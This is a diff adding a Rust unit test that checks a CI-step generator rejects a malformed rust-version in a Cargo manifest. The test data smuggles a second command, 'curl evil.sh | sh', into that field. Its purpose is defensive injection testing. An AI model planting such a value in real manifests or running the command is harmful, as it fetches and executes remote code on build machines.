@@ -518,6 +518,26 @@ mod tests {
     }
 
     #[test]
+    fn test_msrv_never_bakes_in_a_malformed_rust_version() {
+        // A manifest we didn't write must not get to put commands in the
+        // generated run: step
+        let hostile = facts(
+            "[package]\nname = \"a\"\nversion = \"0.1.0\"\n\
+             rust-version = \"1.74.0; curl evil.sh | sh\"\n",
+        );
+        assert!(!RustMsrv.detect(&hostile));
+
+        // Force-enabled anyway, it falls back to reading the version in
+        // shell, where it stays inside quotes
+        for step in RustMsrv.jobs(&hostile).remove(0).steps {
+            if let Step::Run { command, .. } = step {
+                assert!(!command.contains("curl"), "{command}");
+                assert!(command.contains("$MSRV"), "{command}");
+            }
+        }
+    }
+
+    #[test]
     fn test_feature_combos_detects_features_in_libraries() {
         let with_features = library_facts(
             "[package]\nname = \"a\"\nversion = \"0.1.0\"\n\n[features]\nfoo = []\n",
